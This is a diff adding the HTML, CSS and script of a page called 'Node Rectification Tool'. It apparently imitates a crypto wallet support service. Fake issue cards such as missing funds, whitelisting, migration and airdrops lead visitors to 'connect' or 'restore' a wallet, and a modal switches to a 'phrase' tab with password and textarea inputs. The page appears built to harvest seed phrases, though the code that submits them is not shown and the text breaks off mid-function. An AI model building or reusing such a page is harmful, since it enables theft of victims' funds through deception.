@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Node Rectification Tool</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #0a0f1e;
+      --bg2: #0f172a;
+      --card-bg: rgba(15,23,42,0.6);
+      --border: rgba(51,65,85,0.6);
+      --blue: #2563eb;
+      --blue-hover: #1d4ed8;
+      --cyan: #22d3ee;
+      --text: #f1f5f9;
+      --muted: #94a3b8;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* ── HEADER ── */
+    header {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      background: rgba(10,15,30,0.85);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-inner {
+      max-width: 1280px; margin: 0 auto;
+      padding: 0 1.5rem;
+      display: flex; align-items: center; justify-content: space-between;
+      height: 72px;
+    }
+    .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+    .logo-icon {
+      width: 42px; height: 42px; border-radius: 12px;
+      background: linear-gradient(135deg, #3b82f6, #22d3ee);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .logo-icon svg { width: 22px; height: 22px; color: #fff; }
+    .logo-text { font-size: 1.1rem; font-weight: 700; color: #fff; }
+
+    .nav-links { display: flex; align-items: center; gap: 2rem; }
+    .nav-links a { color: var(--muted); text-decoration: none; font-size: 0.95rem; transition: color .2s; }
+    .nav-links a:hover { color: #fff; }
+
+    .btn {
+      display: inline-flex; align-items: center; gap: 8px;
+      padding: .65rem 1.4rem; border-radius: 12px; border: none;
+      font-size: .95rem; font-weight: 600; cursor: pointer;
+      transition: background .2s, box-shadow .2s, transform .15s;
+    }
+    .btn-primary {
+      background: var(--blue); color: #fff;
+    }
+    .btn-primary:hover {
+      background: var(--blue-hover);
+      box-shadow: 0 0 24px rgba(37,99,235,.35);
+      transform: translateY(-1px);
+    }
+    .btn-lg { padding: .85rem 2rem; font-size: 1.05rem; border-radius: 14px; }
+    .btn-outline {
+      background: transparent;
+      border: 1px solid #334155;
+      color: #cbd5e1;
+    }
+    .btn-outline:hover { background: #1e293b; color: #fff; }
+
+    .hamburger {
+      display: none; background: none; border: none;
+      color: var(--muted); cursor: pointer; padding: 6px;
+    }
+    .hamburger svg { width: 26px; height: 26px; }
+    .mobile-menu {
+      display: none; flex-direction: column; gap: 1rem;
+      padding: 1rem 1.5rem 1.2rem;
+      border-top: 1px solid var(--border);
+      background: var(--bg);
+    }
+    .mobile-menu.open { display: flex; }
+    .mobile-menu a { color: var(--muted); text-decoration: none; font-size: 1rem; }
+    .mobile-menu a:hover { color: #fff; }
+
+    @media (max-width: 768px) {
+      .nav-links { display: none; }
+      .hamburger { display: block; }
+      .logo-text { display: none; }
+    }
+
+    /* ── HERO ── */
+    .hero {
+      position: relative; overflow: hidden;
+      padding: 120px 1.5rem 80px;
+    }
+    .hero-glow {
+      position: absolute; top: -100px; left: 50%; transform: translateX(-50%);
+      width: 800px; height: 800px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(59,130,246,.07) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .hero-inner {
+      max-width: 1280px; margin: 0 auto;
+      display: grid; grid-template-columns: 1fr 1fr; gap: 4rem; align-items: center;
+      position: relative;
+    }
+    .hero-content h1 {
+      font-size: clamp(2.4rem, 5vw, 3.6rem);
+      font-weight: 800; line-height: 1.15; margin-bottom: 1.2rem;
+    }
+    .hero-content h1 span {
+      background: linear-gradient(90deg, #60a5fa, #22d3ee);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    }
+    .hero-content p { color: var(--muted); font-size: 1.15rem; line-height: 1.7; margin-bottom: 2rem; }
+    .hero-content p strong { color: #fff; }
+
+    /* Phone mockup */
+    .phone-wrap { display: flex; justify-content: flex-end; position: relative; }
+    .phone-glow {
+      position: absolute; inset: -40px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(59,130,246,.25), rgba(139,92,246,.15), transparent 70%);
+      filter: blur(30px);
+    }
+    .phone-frame {
+      position: relative; background: #fff; border-radius: 48px; padding: 8px;
+      box-shadow: 0 30px 80px rgba(37,99,235,.25);
+    }
+    .phone-inner {
+      background: #1a1f2e; border-radius: 40px;
+      overflow: hidden; width: 300px;
+    }
+    .phone-status {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 10px 22px 4px; background: #1a1f2e;
+    }
+    .phone-status span { color: #fff; font-size: .8rem; font-weight: 600; }
+    .status-icons { display: flex; align-items: center; gap: 6px; }
+    .signal-bars { display: flex; align-items: flex-end; gap: 2px; height: 12px; }
+    .signal-bars div { width: 3px; background: #fff; border-radius: 1px; }
+    .phone-appbar {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 8px 16px; background: #1a1f2e;
+    }
+    .phone-appbar span { color: #fff; font-weight: 600; font-size: .95rem; }
+    .phone-appbar svg { width: 22px; height: 22px; color: #fff; }
+    .phone-body { background: #fff; padding: 14px; }
+    .wallet-balance { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 14px; }
+    .wallet-balance .label { color: #64748b; font-size: .78rem; margin-bottom: 2px; }
+    .wallet-balance .amount { font-size: 1.5rem; font-weight: 800; color: #0f172a; }
+    .wallet-balance .change { color: #10b981; font-size: .78rem; font-weight: 600; }
+    .donut { width: 52px; height: 52px; }
+    .crypto-item {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 8px 0; border-bottom: 1px solid #f1f5f9;
+    }
+    .crypto-item:last-child { border-bottom: none; }
+    .crypto-left { display: flex; align-items: center; gap: 10px; }
+    .crypto-icon {
+      width: 32px; height: 32px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      color: #fff; font-weight: 700; font-size: .8rem;
+    }
+    .crypto-name { font-weight: 600; color: #0f172a; font-size: .85rem; }
+    .crypto-sym { color: #94a3b8; font-size: .72rem; }
+    .crypto-right { text-align: right; }
+    .crypto-amount { font-weight: 600; color: #0f172a; font-size: .85rem; }
+    .crypto-up { color: #10b981; font-size: .72rem; }
+    .crypto-down { color: #ef4444; font-size: .72rem; }
+    .phone-nav {
+      background: #fff; border-top: 1px solid #f1f5f9;
+      display: flex; justify-content: space-around; padding: 10px 0 12px;
+    }
+    .phone-nav-item { text-align: center; font-size: .65rem; color: #94a3b8; }
+    .phone-nav-item.active { color: #3b82f6; }
+    .phone-nav-dot { width: 16px; height: 16px; border-radius: 3px; background: currentColor; opacity: .3; margin: 0 auto 3px; }
+
+    @media (max-width: 900px) {
+      .hero-inner { grid-template-columns: 1fr; text-align: center; }
+      .hero-content { display: flex; flex-direction: column; align-items: center; }
+      .phone-wrap { justify-content: center; }
+      .phone-inner { width: 260px; }
+    }
+
+    /* ── ISSUES SECTION ── */
+    .issues-section { padding: 80px 1.5rem; }
+    .section-inner { max-width: 1280px; margin: 0 auto; }
+    .section-header { text-align: center; margin-bottom: 3rem; }
+    .section-header h2 { font-size: clamp(1.8rem, 3.5vw, 2.6rem); font-weight: 800; margin-bottom: .6rem; }
+    .section-header p { color: var(--muted); font-size: 1.05rem; }
+
+    .issues-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+      gap: 1.25rem;
+    }
+    .issue-card {
+      position: relative;
+      background: rgba(15,23,42,0.55);
+      border: 1px solid rgba(51,65,85,0.55);
+      border-radius: 20px; padding: 1.5rem;
+      cursor: pointer;
+      transition: border-color .25s, background .25s, transform .25s, box-shadow .25s;
+      backdrop-filter: blur(8px);
+    }
+    .issue-card:hover {
+      border-color: rgba(59,130,246,.4);
+      background: rgba(30,41,59,0.6);
+      transform: translateY(-4px);
+      box-shadow: 0 12px 40px rgba(37,99,235,.1);
+    }
+    .issue-card:hover .card-title { color: #60a5fa; }
+    .issue-card:hover .card-arrow { opacity: 1; }
+    .card-icon {
+      width: 48px; height: 48px; border-radius: 14px;
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 1rem;
+      transition: transform .25s;
+    }
+    .issue-card:hover .card-icon { transform: scale(1.1); }
+    .card-icon svg { width: 24px; height: 24px; color: #fff; }
+    .card-title { font-size: 1rem; font-weight: 700; color: #f1f5f9; margin-bottom: .5rem; transition: color .2s; }
+    .card-desc { font-size: .85rem; color: var(--muted); line-height: 1.6; }
+    .card-arrow {
+      position: absolute; bottom: 1rem; right: 1rem;
+      opacity: 0; transition: opacity .2s;
+    }
+    .card-arrow svg { width: 18px; height: 18px; color: #60a5fa; }
+
+    /* Icon gradient classes */
+    .grad-blue    { background: linear-gradient(135deg,#3b82f6,#22d3ee); }
+    .grad-purple  { background: linear-gradient(135deg,#a855f7,#ec4899); }
+    .grad-emerald { background: linear-gradient(135deg,#10b981,#14b8a6); }
+    .grad-orange  { background: linear-gradient(135deg,#f97316,#f59e0b); }
+    .grad-red     { background: linear-gradient(135deg,#ef4444,#f43f5e); }
+    .grad-yellow  { background: linear-gradient(135deg,#eab308,#f97316); }
+    .grad-indigo  { background: linear-gradient(135deg,#6366f1,#8b5cf6); }
+    .grad-cyan    { background: linear-gradient(135deg,#06b6d4,#3b82f6); }
+    .grad-pink    { background: linear-gradient(135deg,#ec4899,#d946ef); }
+    .grad-violet  { background: linear-gradient(135deg,#8b5cf6,#a855f7); }
+
+    /* ── CTA SECTION ── */
+    .cta-section {
+      position: relative; padding: 90px 1.5rem; text-align: center; overflow: hidden;
+    }
+    .cta-bg {
+      position: absolute; inset: 0;
+      background: linear-gradient(135deg, rgba(37,99,235,.15), rgba(139,92,246,.15));
+    }
+    .cta-glow {
+      position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%,-50%);
+      width: 600px; height: 600px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(59,130,246,.1), transparent 70%);
+    }
+    .cta-inner { position: relative; max-width: 720px; margin: 0 auto; }
+    .cta-tag {
+      display: inline-block; color: #60a5fa;
+      font-size: .85rem; font-weight: 600; letter-spacing: .1em;
+      text-transform: uppercase; margin-bottom: 1rem;
+    }
+    .cta-inner h2 { font-size: clamp(2rem,4.5vw,3rem); font-weight: 800; margin-bottom: 2rem; }
+
+    /* ── FOOTER ── */
+    footer {
+      border-top: 1px solid rgba(51,65,85,.4);
+      padding: 2rem 1.5rem; text-align: center; color: var(--muted); font-size: .875rem;
+    }
+
+    /* ── MODAL OVERLAY ── */
+    .modal-overlay {
+      display: none; position: fixed; inset: 0; z-index: 200;
+      background: rgba(0,0,0,.7); backdrop-filter: blur(6px);
+      align-items: center; justify-content: center; padding: 1rem;
+    }
+    .modal-overlay.open { display: flex; }
+    .modal {
+      background: #0f172a; border: 1px solid #1e293b;
+      border-radius: 24px; width: 100%; max-width: 500px;
+      padding: 2rem; position: relative;
+      animation: fadeUp .3s ease;
+    }
+    @keyframes fadeUp { from { opacity:0; transform:translateY(16px); } to { opacity:1; transform:none; } }
+    .modal-close {
+      position: absolute; top: 1rem; right: 1rem;
+      background: none; border: none; color: #64748b; cursor: pointer; padding: 4px;
+    }
+    .modal-close:hover { color: #fff; }
+    .modal-close svg { width: 22px; height: 22px; }
+    .modal-header { margin-bottom: 1.5rem; }
+    .modal-title {
+      display: flex; align-items: center; gap: 10px;
+      font-size: 1.2rem; font-weight: 700; color: #fff;
+    }
+    .modal-title svg { width: 20px; height: 20px; color: #60a5fa; }
+    .modal-subtitle { color: #64748b; font-size: .9rem; margin-top: .3rem; }
+    .modal-subtitle span { color: #60a5fa; }
+
+    /* Wallet grid */
+    .wallet-grid { display: grid; grid-template-columns: 1fr 1fr; gap: .75rem; }
+    .wallet-btn {
+      display: flex; align-items: center; gap: 12px;
+      padding: 1rem 1.1rem;
+      background: rgba(30,41,59,.5); border: 1px solid #334155;
+      border-radius: 14px; cursor: pointer;
+      transition: border-color .2s, background .2s;
+      color: #cbd5e1; font-size: .95rem; font-weight: 500;
+    }
+    .wallet-btn:hover { border-color: rgba(59,130,246,.5); background: #1e293b; color: #fff; }
+    .wallet-emoji { font-size: 1.6rem; }
+
+    /* Tabs */
+    .tabs { margin-bottom: 1rem; }
+    .tab-list {
+      display: flex; background: rgba(30,41,59,.5);
+      border: 1px solid #334155; border-radius: 12px; padding: 4px; gap: 4px;
+    }
+    .tab-btn {
+      flex: 1; padding: .5rem; border: none; background: none;
+      color: #64748b; font-size: .85rem; font-weight: 500;
+      border-radius: 9px; cursor: pointer; transition: background .2s, color .2s;
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+    }
+    .tab-btn.active { background: #2563eb; color: #fff; }
+    .tab-panel { display: none; }
+    .tab-panel.active { display: block; }
+
+    label { display: block; color: #cbd5e1; font-size: .875rem; margin-bottom: .4rem; }
+    textarea, input[type="password"] {
+      width: 100%; background: rgba(30,41,59,.5);
+      border: 1px solid #334155; border-radius: 10px;
+      color: #fff; font-size: .9rem; padding: .75rem 1rem;
+      resize: vertical; font-family: inherit; transition: border-color .2s;
+    }
+    textarea { min-height: 100px; }
+    textarea:focus, input[type="password"]:focus {
+      outline: none; border-color: #3b82f6;
+    }
+    textarea::placeholder, input::placeholder { color: #475569; }
+    .input-hint { color: #475569; font-size: .78rem; margin-top: .35rem; }
+
+    /* Modal buttons row */
+    .modal-actions { display: flex; gap: .75rem; margin-top: 1.25rem; }
+    .modal-actions .btn { flex: 1; justify-content: center; }
+
+    /* Success state */
+    .modal-success { text-align: center; padding: 2rem 1rem; }
+    .success-icon {
+      width: 64px; height: 64px; border-radius: 50%;
+      background: rgba(16,185,129,.15);
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 1.2rem;
+    }
+    .success-icon svg { width: 32px; height: 32px; color: #10b981; }
+    .modal-success h3 { font-size: 1.2rem; font-weight: 700; margin-bottom: .5rem; }
+    .modal-success p { color: #64748b; font-size: .9rem; }
+
+    /* Loading spinner */
+    .spinner {
+      width: 16px; height: 16px; border: 2px solid rgba(255,255,255,.3);
+      border-top-color: #fff; border-radius: 50%;
+      animation: spin .7s linear infinite; display: inline-block;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .modal-footer-note { color: #475569; font-size: .78rem; text-align: center; margin-top: 1rem; }
+
+    /* ── ANIMATIONS ── */
+    .fade-in-up {
+      opacity: 0; transform: translateY(24px);
+      transition: opacity .6s ease, transform .6s ease;
+    }
+    .fade-in-up.visible { opacity: 1; transform: none; }
+    .fade-in-left {
+      opacity: 0; transform: translateX(-28px);
+      transition: opacity .6s ease, transform .6s ease;
+    }
+    .fade-in-left.visible { opacity: 1; transform: none; }
+    .fade-in-right {
+      opacity: 0; transform: translateX(28px);
+      transition: opacity .6s ease, transform .6s ease;
+    }
+    .fade-in-right.visible { opacity: 1; transform: none; }
+  </style>
+</head>
+<body>
+
+<!-- ══════════ HEADER ══════════ -->
+<header>
+  <div class="nav-inner">
+    <a href__="#" class="logo">
+      <div class="logo-icon">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round"
+            d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
+        </svg>
+      </div>
+      <span class="logo-text">Node Rectification</span>
+    </a>
+
+    <nav class="nav-links">
+      <a href__="#">Home</a>
+      <a href="index2.html"><button class="btn btn-primary">
+        <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round"
+            d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
+        </svg>
+        Connect Wallet
+      </button> </a>
+    </nav>
+
+    <button class="hamburger" onclick="toggleMobile()" aria-label="Menu">
+      <svg id="ham-open" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"/>
+      </svg>
+      <svg id="ham-close" style="display:none" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
+      </svg>
+    </button>
+  </div>
+
+  <div class="mobile-menu" id="mobile-menu">
+
+    <a href="index2.html"><button class="btn btn-primary" >
+      Connect Wallet
+    </button></a>
+  </div>
+</header>
+
+<!-- ══════════ HERO ══════════ -->
+<section class="hero">
+  <div class="hero-glow"></div>
+  <div class="hero-inner">
+
+    <div class="hero-content fade-in-left">
+      <h1>Node Rectification <span>Tool</span></h1>
+      <p>Over <strong>76 million</strong> wallets created to buy, sell and earn crypto</p>
+      <a href="index2.html"><button class="btn btn-primary btn-lg" onclick="openModal()">
+        <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round"
+            d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
+        </svg>
+        Restore Account
+      </button></a>
+    </div>
+
+    <!-- Phone Mockup -->
+    <div class="phone-wrap fade-in-right">
+      <div class="phone-glow"></div>
+      <div class="phone-frame">
+        <div class="phone-inner">
+          <!-- Status bar -->
+          <div class="phone-status">
+            <span>9:41</span>
+            <div class="status-icons">
+              <div class="signal-bars">
+                <div style="height:4px"></div>
+                <div style="height:6px"></div>
+                <div style="height:9px"></div>
+                <div style="height:12px"></div>
+              </div>
+              <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24" style="color:#fff">
+                <path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/>
+              </svg>
+              <div style="width:22px;height:11px;border:1.5px solid #fff;border-radius:3px;position:relative;">
+                <div style="position:absolute;left:2px;top:2px;right:4px;bottom:2px;background:#fff;border-radius:1px;"></div>
+              </div>
+            </div>
+          </div>
+          <!-- App bar -->
+          <div class="phone-appbar">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"/>
+            </svg>
+            <span>Home</span>
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round"
+                d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z"/>
+            </svg>
+          </div>
+          <!-- Wallet body -->
+          <div class="phone-body">
+            <div class="wallet-balance">
+              <div>
+                <div class="label">Total Balance</div>
+                <div class="amount">$22,982.91</div>
+                <div class="change">+$407.66 (3.14%) 24hrs</div>
+              </div>
+              <svg class="donut" viewBox="0 0 36 36">
+                <path d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
+                  fill="none" stroke="#e5e7eb" stroke-width="3"/>
+                <path d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
+                  fill="none" stroke="#f97316" stroke-width="3" stroke-dasharray="75, 100"/>
+              </svg>
+            </div>
+            <!-- Crypto rows -->
+            <div class="crypto-item">
+              <div class="crypto-left">
+                <div class="crypto-icon" style="background:#f97316">B</div>
+                <div>
+                  <div class="crypto-name">Bitcoin</div>
+                  <div class="crypto-sym">BTC</div>
+                </div>
+              </div>
+              <div class="crypto-right">
+                <div class="crypto-amount">$15,879.90</div>
+                <div class="crypto-up">+1.56%</div>
+              </div>
+            </div>
+            <div class="crypto-item">
+              <div class="crypto-left">
+                <div class="crypto-icon" style="background:#3b82f6">E</div>
+                <div>
+                  <div class="crypto-name">Ethereum</div>
+                  <div class="crypto-sym">ETH</div>
+                </div>
+              </div>
+              <div class="crypto-right">
+                <div class="crypto-amount">$1,103.01</div>
+                <div class="crypto-up">+1.39%</div>
+              </div>
+            </div>
+            <div class="crypto-item">
+              <div class="crypto-left">
+                <div class="crypto-icon" style="background:#10b981">B</div>
+                <div>
+                  <div class="crypto-name">Bitcoin Cash</div>
+                  <div class="crypto-sym">BCH</div>
+                </div>
+              </div>
+              <div class="crypto-right">
+                <div class="crypto-amount">$346.12</div>
+                <div class="crypto-down">-0.21%</div>
+              </div>
+            </div>
+          </div>
+          <!-- Bottom nav -->
+          <div class="phone-nav">
+            <div class="phone-nav-item active"><div class="phone-nav-dot"></div>Home</div>
+            <div class="phone-nav-item"><div class="phone-nav-dot"></div>Activity</div>
+            <div class="phone-nav-item"><div class="phone-nav-dot"></div>Swap</div>
+            <div class="phone-nav-item"><div class="phone-nav-dot"></div>Buy</div>
+            <div class="phone-nav-item"><div class="phone-nav-dot"></div>Transfer</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ══════════ ISSUES SECTION ══════════ -->
+<section class="issues-section">
+  <div class="section-inner">
+    <div class="section-header fade-in-up">
+      <h2>Please Select Issue Category</h2>
+      <p>Which of these is related to your issue?</p>
+    </div>
+
+    <div class="issues-grid" id="issues-grid">
+      <!-- Cards injected by JS -->
+    </div>
+  </div>
+</section>
+
+<!-- ══════════ CTA SECTION ══════════ -->
+<section class="cta-section">
+  <div class="cta-bg"></div>
+  <div class="cta-glow"></div>
+  <div class="cta-inner fade-in-up">
+    <span class="cta-tag">Ready to Start</span>
+    <h2>Restore Your Account</h2>
+    <button class="btn btn-primary btn-lg" onclick="openModal()">
+      Get Started
+      <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"/>
+      </svg>
+    </button>
+  </div>
+</section>
+
+<!-- ══════════ FOOTER ══════════ -->
+<footer>
+  <p>© 2025 Node Rectification Tool. All rights reserved.</p>
+</footer>
+
+
+
+
+
+    
+   
+
+    
+
+
+<script>
+  /* ── Issue categories data ── */
+  const issues = [
+    { title: "Swap/Exchange", desc: "Click here for any issues with swapping/exchange of coins", grad: "grad-blue",
+      svg: `<path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>` },
+    { title: "Connect to Dapps", desc: "Click here to connect decentralised web applications to mobile wallets or enable Dapp on mobile wallets or extension", grad: "grad-purple",
+      svg: `<path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"/>` },
+    { title: "Whitelisting Issues", desc: "Click here to manually whitelist your wallet.", grad: "grad-emerald",
+      svg: `<path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>` },
+    { title: "Missing Funds/Irregular Token Balance", desc: "Click here to recover lost or missing funds", grad: "grad-orange",
+      svg: `<path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>` },
+    { title: "High Gas Fees", desc: "Click here to rectify", grad: "grad-red",
+      svg: `<path stroke-linecap="round" stroke-linejoin="round" d="M17.657 18.657A8 8 0 016.343 7.343S7 9 9 10c0-2 .5-5 2.986-7C14 5 16.09 5.777 17.656 7.343A7.975 7.975 0 0120 13a7.975 7.975 0 01-2.343 5.657z"/><path stroke-linecap="round" stroke-linejoin="round" d="M9.879 16.121A3 3 0 1012.015 11L11 14H9c0 .768.293 1.536.879 2.121z"/>` },
+    { title: "Transaction Error", desc: "Do you have any issue with transactions? Click here to rectify", grad: "grad-yellow",
+      svg: `<path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>` },
+    { title: "Staking/Unstaking", desc: "Do you have issues staking your tokens or getting your rewards? Click here to rectify", grad: "grad-indigo",
+      svg: `<path stroke-linecap="round" stroke-linejoin="round" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"/>` },
+    { title: "Migration", desc: "Did you miss the migration window? Click here to manually migrate your tokens", grad: "grad-cyan",
+      svg: `<path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"/>` },
+    { title: "Airdrop Issues", desc: "Do you have issues with an ongoing airdrop? Click here to rectify", grad: "grad-pink",
+      svg: `<path stroke-linecap="round" stroke-linejoin="round" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/>` },
+    { title: "Minting", desc: "Do you have any issues with Minting? Click here to rectify", grad: "grad-violet",
+      svg: `<path stroke-linecap="round" stroke-linejoin="round" d="M5 3v4M3 5h4M6 17v4m-2-2h4m5-16l2.286 6.857L21 12l-5.714 2.143L13 21l-2.286-6.857L5 12l5.714-2.143L13 3z"/>` },
+  ];
+
+  /* Render issue cards */
+  const grid = document.getElementById('issues-grid');
+  issues.forEach((issue, i) => {
+    const card = document.createElement('div');
+    card.className = 'issue-card fade-in-up';
+    card.style.transitionDelay = (i * 50) + 'ms';
+    card.onclick = () => openModal(issue.title);
+    card.innerHTML = `
+      <div class="card-icon ${issue.grad}">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">${issue.svg}</svg>
+      </div>
+      <div class="card-title">${issue.title}</div>
+      <div class="card-desc">${issue.desc}</div>
+      <div class="card-arrow">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"/>
+        </svg>
+      </div>`;
+    grid.appendChild(card);
+  });
+
+  /* ── Scroll animations ── */
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.1 });
+
+  document.querySelectorAll('.fade-in-up, .fade-in-left, .fade-in-right').forEach(el => observer.observe(el));
+
+  /* ── Mobile menu ── */
+  function toggleMobile() {
+    const menu = document.getElementById('mobile-menu');
+    const open = document.getElementById('ham-open');
+    const close = document.getElementById('ham-close');
+    menu.classList.toggle('open');
+    open.style.display = menu.classList.contains('open') ? 'none' : 'block';
+    close.style.display = menu.classList.contains('open') ? 'block' : 'none';
+  }
+  function closeMobile() {
+    const menu = document.getElementById('mobile-menu');
+    menu.classList.remove('open');
+    document.getElementById('ham-open').style.display = 'block';
+    document.getElementById('ham-close').style.display = 'none';
+  }
+
+  /* ── Modal ── */
+  let currentStep = 1;
+
+  function openModal(issueName) {
+    const overlay = document.getElementById('modal-overlay');
+    overlay.classList.add('open');
+    document.body.style.overflow = 'hidden';
+    showStep(1);
+    const subtitle = document.getElementById('modal-subtitle');
+    subtitle.innerHTML = issueName
+      ? `Issue: <span>${issueName}</span>`
+      : 'Select your wallet to continue';
+  }
+
+  function closeModal() {
+    document.getElementById('modal-overlay').classList.remove('open');
+    document.body.style.overflow = '';
+    setTimeout(() => showStep(1), 200);
+  }
+
+  function handleOverlayClick(e) {
+    if (e.target === document.getElementById('modal-overlay')) closeModal();
+  }
+
+  function showStep(n) {
+    currentStep = n;
+    document.getElementById('step-1').style.display = n === 1 ? 'block' : 'none';
+    document.getElementById('step-2').style.display = n === 2 ? 'block' : 'none';
+    document.getElementById('step-3').style.display = n === 3 ? 'block' : 'none';
+  }
+
+  function selectWallet(name) {
+    document.getElementById('step2-title').innerHTML = `
+      <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
+      </svg>
+      ${name}`;
+    showStep(2);
+    switchTab('phrase', document.querySelector('.tab-btn'));
+  }
+
+  function goBack() { showStep(1); }
+
+  function switchTab(tab, btn) {
+    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
